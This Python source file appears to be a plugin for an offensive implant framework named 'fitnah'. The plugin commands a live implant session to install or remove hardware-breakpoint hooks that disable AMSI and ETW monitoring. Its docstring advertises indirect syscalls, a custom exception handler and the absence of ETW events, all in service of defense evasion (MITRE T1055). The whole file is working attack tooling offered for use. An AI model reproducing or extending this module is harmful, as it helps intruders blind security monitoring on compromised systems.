"""defense_evasion/hardware_breakpoints — install/remove hardware debug register hooks on arbitrary functions. MITRE T1055

Uses implant's ISysNtGetContextThread / ISysNtSetContextThread (indirect syscalls)
to set Dr0-Dr3 on any function address with a custom VEH handler.
No byte patches, no kernel driver, no ETW event generated.
"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class HardwareBreakpoints(BasePlugin):
    NAME        = "hardware_breakpoints"
    DESCRIPTION = "Set/clear hardware debug register hooks on arbitrary function — no byte patches."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("action",   str, required=False, default="init",
              help="init (install AMSI/ETW hwbp) | remove (uninstall all)"),
    )

    @mitre("T1055")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        action = params.get("action", "init").lower()
        cmd = "hwbp_init" if action == "init" else "hwbp_remove"
        r   = ctx.send(cmd, {})
        if r["status"] != "ok":
            return ModuleResult.err(f"{cmd} failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or f"{cmd} completed")
